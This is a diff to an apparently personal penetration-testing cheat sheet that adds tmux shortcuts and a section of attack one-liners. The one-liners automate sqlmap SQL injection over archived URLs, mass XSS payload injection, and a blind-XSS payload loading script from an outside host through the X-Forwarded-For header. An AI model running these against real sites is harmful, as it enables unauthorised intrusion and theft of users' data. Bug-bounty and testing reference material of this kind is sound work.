@@ -20,8 +20,18 @@ flask -> usually jinja2
 ```2> /dev/null``` - hides error output  
 
 # Tmux
-`tmux a` - attaches session
-`tmux -S <name>` - attaches file session or creates one of that name
+re-attach session:  
+`tmux a`  
+Attach file session:  
+`tmux -S <name>`   
+Rename session:  
+`prefix + $`    
+Pane -> Window:
+`prefix + !`  
+Move pane left/right:  
+`prefix + { or }`
+Save / restore:  
+`prefix + s / r`
 
 # Brute-Force
 ffuf  
@@ -110,4 +120,13 @@ linpeas.sh big
 1. `find / -perm -u=s -type f 2>/dev/null` - suid bit finder
 
 
-     
+# One liners
+
+Sqlmap from wayback:   
+`waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"`  
+
+XSS from wayback:  
+`echo "testphp.vulnweb.com" | waybackurls | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | urldedupe -s | grep -IE "[?].*[&]?" | grep "=" | unew -p | pvreplace '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' | xsschecker -match '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' -vuln`  
+
+XSS in x-forward header:  
+`findomain -t http://TARGET.COM | gau | bxss -payload '"><script src=https://chirag.bxss.in></script>' -header "X-Forwarded-For"`  
